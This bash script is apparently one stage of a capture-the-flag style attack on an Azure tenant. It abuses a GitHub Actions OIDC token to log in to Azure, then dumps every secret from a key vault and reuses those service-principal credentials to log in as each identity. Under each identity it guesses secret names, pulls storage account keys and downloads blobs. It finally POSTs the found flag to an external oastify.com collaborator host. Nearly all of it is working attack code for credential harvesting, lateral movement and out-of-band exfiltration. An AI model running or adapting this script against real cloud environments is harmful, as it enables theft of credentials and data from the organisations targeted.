#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 5.
# Run 4 showed: all 6 principals authenticate but are denied LIST on kv-tbl-sec-x3euoz,
# and the federated identity sees containers (control plane) but is denied blob access
# (data plane). So: (a) try every principal against storage, especially the 'loot'
# container, and (b) try secret GET with guessed names - list-denied often still allows get.
#
# Read-only, scoped to rg-tbl-platform-prod-sea. No secret value echoed; flag goes OOB only.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
RG="rg-tbl-platform-prod-sea"
SRC_VAULT="kv-tbl-prod-x3euoz"
TGT_VAULT="kv-tbl-sec-x3euoz"
FLAGRE='DF26\{[^}]+\}'
FOUND=""
WORK=$(mktemp -d)
GUESS="flag FLAG ctf-flag challenge-flag tebamoto-flag final-flag df26 DF26 flag1 the-flag
secret admin-password root-password master-key breach-notes incident-notes loot exfil
storefront-flag platform-flag prod-flag tbl-flag answer solution"

say() { echo "[*] $*"; }
note() { local m; m=$(grep -oE "$FLAGRE" <<<"$1" | head -1); [ -n "$m" ] && FOUND="$m"; echo "${m:+MATCH}${m:--}"; }

federate() {
  local t; t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
  [ -z "$t" ] && return 1
  az logout >/dev/null 2>&1
  az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
    --federated-token "$t" --allow-no-subscriptions >/dev/null 2>&1
}

# try every guessed secret name in TGT_VAULT under the current identity
try_gets() {
  local who="$1" hit=0
  for G in $GUESS; do
    V=$(az keyvault secret show --vault-name "$TGT_VAULT" --name "$G" --query value -o tsv 2>/dev/null)
    [ -z "$V" ] && continue
    hit=1; say "      GET ok: $G len=${#V} flag=$(note "$V")"
    [ -n "$FOUND" ] && return 0
  done
  [ $hit -eq 0 ] && say "      no guessed name readable"
  return 0
}

# try all storage data-plane access under the current identity
try_storage() {
  local who="$1"
  for A in $(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null); do
    K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>/dev/null)
    if [ ${#K} -ge 40 ]; then AUTH=(--account-key "$K"); M=key; else AUTH=(--auth-mode login); M=aad; fi
    for C in $(az storage container list --account-name "$A" "${AUTH[@]}" --query "[].name" -o tsv 2>/dev/null); do
      BL=$(az storage blob list --account-name "$A" "${AUTH[@]}" -c "$C" --query "[].name" -o tsv 2>&1)
      grep -qiE 'error|denied|forbidden|permission' <<<"$BL" && continue
      say "      $A/$C readable via $M: $(tr '\n' ' ' <<<"$BL" | head -c 150)"
      for B in $BL; do
        D=$(az storage blob download --account-name "$A" "${AUTH[@]}" -c "$C" -n "$B" \
            --file /dev/stdout -o none 2>/dev/null)
        say "        blob=$B len=${#D} flag=$(note "$D")"
        [ -n "$FOUND" ] && return 0
      done
    done
  done
  return 0
}

federate && say "federated login OK" || { say "federated FAILED"; exit 1; }

say "=== caching principals ==="
for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
done
say "cached $(ls -1 "$WORK" | wc -l)"

say "=== federated identity: guessed GETs + storage ==="
try_gets "federated"; [ -z "$FOUND" ] && try_storage "federated"

if [ -z "$FOUND" ]; then
  for F in "$WORK"/*; do
    [ -s "$F" ] || continue
    S=$(basename "$F")
    CID=$(jq -r '.appId // .clientId // empty' <"$F"); SEC=$(jq -r '.clientSecret // empty' <"$F")
    TEN=$(jq -r '.tenantId // empty' <"$F")
    az logout >/dev/null 2>&1
    az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
      --allow-no-subscriptions >/dev/null 2>&1 || { say "  $S -> login failed"; continue; }
    say "  --- as $S (${CID:0:8}…)"
    try_gets "$S";  [ -n "$FOUND" ] && break
    try_storage "$S"; [ -n "$FOUND" ] && break
  done
fi

rm -rf "$WORK"
if [ -n "$FOUND" ]; then
  say "FLAG FOUND (${#FOUND} chars) - OOB only"
  curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
    "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
else
  say "no match"
fi
az logout >/dev/null 2>&1; say "done"
